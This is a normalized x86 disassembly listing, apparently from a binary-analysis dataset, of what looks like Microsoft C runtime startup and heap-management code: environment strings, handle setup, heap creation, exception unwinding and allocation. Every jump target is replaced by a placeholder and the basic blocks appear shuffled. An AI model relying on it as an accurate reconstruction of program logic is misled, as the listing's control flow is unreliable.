mov [ rwxdata ] 0x2
jmp rwxdata
cmp [ edi ] bl
mov eax edi
je rwxdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je rwxdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je rwxdata
inc eax
inc eax
cmp [ eax ] bx
jne rwxdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_407d1b
mov esi eax
pop ecx
cmp esi ebx
jne rwxdata
inc eax
cmp [ eax ] bl
jne rwxdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp rwxdata
push ebp
call sub_407d1b
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je rwxdata
inc eax
inc eax
cmp [ eax ] bx
jne rwxdata
push ebp
push edi
push esi
call sub_405aa0
add esp 0xc
xor esi esi
jmp rwxdata
inc eax
cmp [ eax ] bl
jne rwxdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne rwxdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp rwxdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4068e6
pop ecx
mov [ esp + 0x10 ] ebx
sub_407309
sub esp 0x44
push ebx
push ebp
push esi
push edi
push 0x100
call sub_407d1b
mov esi eax
pop ecx
test esi esi
jne rwxdata
mov [ rwxdata ] esi
mov [ rwxdata ] 0x20
lea eax [ esi + 0x100 ]
push 0x1b
call sub_405f21
pop ecx
lea eax [ esp + 0x10 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x42 ] 0x0
je rwxdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
mov [ esi + 0x5 ] 0xa
mov eax [ rwxdata ]
add esi 0x8
add eax 0x100
jmp rwxdata
xor ebx ebx
mov eax [ esp + 0x44 ]
test eax eax
je rwxdata
cmp esi eax
jae rwxdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne rwxdata
mov esi [ eax ]
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl rwxdata
mov eax [ rwxdata ]
cmp [ eax + ebx * 8 ] 0xffffffff
lea esi [ eax + ebx * 8 ]
jne rwxdata
push [ rwxdata ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp rwxdata
cmp [ rwxdata ] esi
jge rwxdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp rwxdata
push edi
call [ GetFileType@IAT ]
test eax eax
je rwxdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je rwxdata
xor edi edi
test esi esi
jle rwxdata
mov edi rwxdata
inc ebx
cmp ebx 0x3
jl rwxdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne rwxdata
mov eax [ ebx ]
cmp eax 0xffffffff
je rwxdata
mov esi [ rwxdata ]
add [ rwxdata ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
cmp eax 0x3
jne rwxdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl rwxdata
mov cl [ ebp ]
test cl 0x1
je rwxdata
add edi 0x4
cmp [ rwxdata ] esi
jl rwxdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
jmp rwxdata
or [ esi + 0x4 ] 0x8
jmp rwxdata
test cl 0x8
jne rwxdata
push 0x100
call sub_407d1b
test eax eax
pop ecx
je rwxdata
jmp rwxdata
cmp eax ecx
jae rwxdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je rwxdata
sub_4074b4
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne rwxdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je rwxdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_4074e1
push ebp
mov ebp esp
mov eax 0x122c
call sub_4098e0
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je rwxdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push rwxdata
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je rwxdata
cmp [ ebp - 0x88 ] 0x2
jne rwxdata
lea eax [ ebp - 0x4 ]
push eax
call sub_4074b4
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je rwxdata
cmp [ ebp - 0x94 ] 0x5
jb rwxdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push rwxdata
call sub_4098a0
add esp 0xc
test eax eax
jne rwxdata
mov al [ ecx ]
cmp al 0x61
jl rwxdata
push 0x1
pop eax
jmp rwxdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je rwxdata
lea eax [ ebp - 0x122c ]
jmp rwxdata
inc ecx
cmp [ ecx ] bl
jne rwxdata
cmp al 0x7a
jg rwxdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_409820
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl rwxdata
cmp eax ebx
je rwxdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_409760
pop ecx
cmp eax ebx
pop ecx
je rwxdata
inc ecx
cmp [ ecx ] bl
jne rwxdata
cmp al 0x7a
jg rwxdata
inc eax
mov ecx eax
cmp [ eax ] bl
je rwxdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_409530
add esp 0xc
cmp eax 0x2
je rwxdata
cmp [ ecx ] 0x3b
jne rwxdata
cmp eax 0x3
je rwxdata
inc ecx
mov [ ecx ] bl
jmp rwxdata
cmp eax 0x1
je rwxdata
cmp [ ecx ] bl
jne rwxdata
sub_407629
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rwxdata ] eax
je rwxdata
xor eax eax
retn
call sub_4074e1
cmp eax 0x3
mov [ rwxdata ] eax
jne rwxdata
cmp eax 0x2
jne rwxdata
push 0x3f8
call sub_407f25
pop ecx
jmp rwxdata
push 0x1
pop eax
retn
call sub_408776
test eax eax
jne rwxdata
push [ rwxdata ]
call [ HeapDestroy@IAT ]
sub_407688
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push rwxdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4076ca
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_4076a8
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je rwxdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne rwxdata
jmp rwxdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40775e
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je rwxdata
sub_407778
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne rwxdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_4076ca
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp rwxdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je rwxdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp rwxdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je rwxdata
cmp esi 0xffffffff
je rwxdata
js rwxdata
mov eax 0x0
jmp rwxdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_407688
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_4076ca
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_40775e
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_407858
mov eax [ rwxdata ]
cmp eax 0x1
je rwxdata
push 0xfc
call sub_407891
mov eax [ rwxdata ]
pop ecx
test eax eax
je rwxdata
test eax eax
jne rwxdata
push 0xff
call sub_407891
pop ecx
call eax
retn
cmp [ rwxdata ] 0x1
jne rwxdata
sub_407891
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rwxdata
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rwxdata ]
jne rwxdata
add eax 0x8
inc ecx
cmp eax rwxdata
jb rwxdata
pop esi
leave
retn
mov eax [ rwxdata ]
cmp eax 0x1
je rwxdata
cmp edx [ eax ]
je rwxdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rwxdata ]
push 0x0
push eax
push [ esi ]
call sub_407ca0
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne rwxdata
cmp edx 0xfc
je rwxdata
cmp [ rwxdata ] 0x1
je rwxdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne rwxdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_407ca0
inc eax
pop ecx
cmp eax 0x3c
jbe rwxdata
lea eax [ ebp - 0x1a4 ]
push rwxdata
push eax
call sub_409440
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push rwxdata
push eax
call sub_409440
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_409450
lea eax [ ebp - 0xa0 ]
push rwxdata
push eax
call sub_409450
push [ esi + rwxdata ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_409450
push 0x12010
lea eax [ ebp - 0xa0 ]
push rwxdata
push eax
call sub_40990f
add esp 0x2c
pop edi
jmp rwxdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_407ca0
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push rwxdata
push edi
call sub_4099a0
add esp 0x10
sub_4079e4
mov eax [ esp + 0x4 ]
push ebx
cmp eax [ rwxdata ]
push esi
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rwxdata ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je rwxdata
push eax
call sub_408e7b
cmp eax 0xffffffff
pop ecx
jne rwxdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne rwxdata
mov [ rwxdata ] 0x9
jmp rwxdata
xor eax eax
call [ GetLastError@IAT ]
jmp rwxdata
or eax 0xffffffff
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
lea eax [ eax + esi + 0x4 ]
mov eax ebx
jmp rwxdata
push eax
call sub_408d9a
pop ecx
jmp rwxdata
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
retn
sub_407a7e
push ebp
mov ebp esp
sub esp 0x414
mov ecx [ ebp + 0x8 ]
push ebx
cmp ecx [ rwxdata ]
push esi
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ ebx ]
mov al [ eax + esi + 0x4 ]
test al 0x1
je rwxdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne rwxdata
test al 0x20
je rwxdata
xor eax eax
jmp rwxdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je rwxdata
push 0x2
push edi
push ecx
call sub_4079e4
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je rwxdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe rwxdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp rwxdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp rwxdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je rwxdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne rwxdata
mov [ rwxdata ] 0x1c
mov [ rwxdata ] edi
jmp rwxdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je rwxdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne rwxdata
sub eax [ ebp - 0x10 ]
jmp rwxdata
cmp [ ebp + 0x8 ] edi
je rwxdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp rwxdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl rwxdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl rwxdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne rwxdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb rwxdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae rwxdata
push [ ebp + 0x8 ]
call sub_408d9a
pop ecx
jmp rwxdata
mov [ rwxdata ] 0x9
mov [ rwxdata ] eax
jmp rwxdata
sub_407c2b
inc [ rwxdata ]
push 0x1000
call sub_407d1b
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je rwxdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp rwxdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_407ca0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je rwxdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je rwxdata
mov al [ ecx ]
inc ecx
test al al
je rwxdata
mov eax [ ecx - 0x4 ]
test al al
je rwxdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne rwxdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je rwxdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je rwxdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je rwxdata
jmp rwxdata
sub_407d2d
cmp [ esp + 0x4 ] 0xffffffe0
ja rwxdata
xor eax eax
push [ esp + 0x4 ]
call sub_407d59
test eax eax
pop ecx
jne rwxdata
retn
cmp [ esp + 0x8 ] eax
je rwxdata
push [ esp + 0x4 ]
call sub_409aa7
test eax eax
pop ecx
jne rwxdata
sub_407d59
mov eax [ rwxdata ]
push esi
mov esi [ esp + 0x8 ]
cmp eax 0x3
jne rwxdata
cmp eax 0x2
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
test esi esi
jne rwxdata
mov eax [ esp + 0x8 ]
test eax eax
je rwxdata
push esi
call sub_4082c1
test eax eax
pop ecx
je rwxdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp rwxdata
pop esi
retn
push esi
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov eax esi
shr eax 0x4
push eax
call sub_408a6e
test eax eax
pop ecx
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
pop esi
retn
jmp rwxdata
sub_407dcd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne rwxdata
cmp [ rwxdata ] 0x0
jne rwxdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rwxdata ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rwxdata ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je rwxdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja rwxdata
mov [ rwxdata ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je rwxdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_407e40
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne rwxdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp rwxdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne rwxdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb rwxdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja rwxdata
jb rwxdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe rwxdata
sub_407eb0
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne rwxdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp rwxdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne rwxdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb rwxdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja rwxdata
jb rwxdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe rwxdata
sub_407f25
push 0x140
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rwxdata ] eax
jne rwxdata
mov ecx [ esp + 0x4 ]
and [ rwxdata ] 0x0
and [ rwxdata ] 0x0
push 0x1
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x10
pop eax
retn
retn
sub_407f6d
mov eax [ rwxdata ]
lea ecx [ eax + eax * 4 ]
mov eax [ rwxdata ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb rwxdata
retn
add eax 0x14
jmp rwxdata
cmp eax ecx
jae rwxdata
sub_407f98
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne rwxdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe rwxdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe rwxdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne rwxdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne rwxdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe rwxdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae rwxdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne rwxdata
cmp ebx edx
je rwxdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe rwxdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne rwxdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne rwxdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne rwxdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae rwxdata
cmp ebx edx
je rwxdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp rwxdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
mov esi [ ebp + 0xc ]
jmp rwxdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne rwxdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] edi
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call esi
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rwxdata ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rwxdata ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne rwxdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp rwxdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne rwxdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae rwxdata
cmp [ eax + 0x8 ] 0xffffffff
jne rwxdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rwxdata ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne rwxdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne rwxdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rwxdata ]
push [ eax + 0x10 ]
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
mov eax [ rwxdata ]
mov edx [ rwxdata ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rwxdata ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_409ad0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rwxdata ]
cmp eax [ rwxdata ]
jbe rwxdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp rwxdata
mov eax [ rwxdata ]
mov [ rwxdata ] eax
sub [ ebp + 0x8 ] 0x14
sub_4082c1
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rwxdata ]
mov edx [ rwxdata ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge rwxdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp rwxdata
